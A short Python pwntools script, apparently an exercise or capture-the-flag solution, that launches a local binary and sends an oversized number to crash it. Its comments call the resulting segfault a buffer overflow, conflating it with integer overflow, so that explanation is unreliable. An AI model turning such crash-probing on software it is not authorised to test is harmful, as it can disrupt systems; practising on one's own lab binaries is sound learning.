#compile question.cpp using "g++ -o question question.cpp"
#run in python3
#gets EOF because Segmentation fault occurs SIGSEV which indicates Buffer Overflow
from pwn import *
p = process('./question')
p.recvuntil("numbers?")
#payload should be greater than int range so as to overflow the range
payload = ("11111111111")
p.sendline(payload)
p.interactive()
